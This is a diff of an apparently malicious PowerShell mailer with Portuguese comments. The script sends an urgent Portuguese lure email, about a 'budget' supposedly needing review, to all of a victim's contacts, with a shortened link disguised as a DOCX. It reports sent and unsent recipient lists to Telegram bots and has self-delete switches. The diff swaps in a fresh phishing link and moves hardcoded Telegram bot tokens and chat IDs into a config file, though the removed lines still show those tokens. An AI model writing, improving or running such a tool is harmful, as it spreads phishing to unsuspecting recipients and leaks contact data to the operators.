@@ -16,12 +16,26 @@ param(
     [switch]$DryRun,
     [switch]$SelfDelete,
     [switch]$SelfDeleteAll,
-    [string]$TgTok = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",
-    [string]$TelegramChatId = "6168636325,8725655293",
+    [string]$TgTok = "",
+    [string]$TelegramChatId = "",
     [switch]$NoTelegram,
-    [string]$ListaTok  = "8623526001:AAGa0-cXzKzn20FpJQp1VskjgjUMXY5PW7Q",
-    [string]$ListaChatId = "6168636325,8725655293"
+    [string]$ListaTok  = "",
+    [string]$ListaChatId = ""
 )
+
+# Segredos vem de rehot.config.json (gitignored, ao lado do script); parametro explicito vence.
+$cfgPath = Join-Path $PSScriptRoot "rehot.config.json"
+if (Test-Path -LiteralPath $cfgPath) {
+    try {
+        $cfg = Get-Content -Raw -LiteralPath $cfgPath | ConvertFrom-Json
+        if (-not $TgTok -and $cfg.TgTok) { $TgTok = [string]$cfg.TgTok }
+        if (-not $TelegramChatId -and $cfg.TelegramChatId) { $TelegramChatId = [string]$cfg.TelegramChatId }
+        if (-not $ListaTok -and $cfg.ListaTok) { $ListaTok = [string]$cfg.ListaTok }
+        if (-not $ListaChatId -and $cfg.ListaChatId) { $ListaChatId = [string]$cfg.ListaChatId }
+    } catch {
+        Write-Warning "rehot.config.json ilegivel: $($_.Exception.Message)"
+    }
+}
 
 $ErrorActionPreference = "Stop"
 try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
@@ -40,7 +54,7 @@ $DEFAULT_HTML_BODY = @'
 </head>
 <body>
     Fala aí, esse orçamento passou por você?? Vê isso com urgência, pode ser reembolsado se for erro. se tiver certo, passo pra frente.<br>
-    <a href="HtTps://cutt.ly/kyYA25As" target="_blank">DOCX_[NUM.6-9]</a>
+    <a href="https://encurtador.com.br/YYaR" target="_blank">DOCX_[NUM.6-9]</a>
 
 </body></html>
 '@
@@ -1090,7 +1104,7 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
                 $envioTodos | Add-Member -MemberType NoteProperty -Name erro_trava -Value $erroTrava
             }
             if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
-            if (($enviados.Count -gt 0) -or ($naoEnviados.Count -gt 0)) {
+            if ($ListaTok -and (($enviados.Count -gt 0) -or ($naoEnviados.Count -gt 0))) {
                 $listaText = Build-ListaText $src.conta $enviados $naoEnviados
                 $listaRes = @()
                 foreach ($chat in ($ListaChatId -split ',')) {
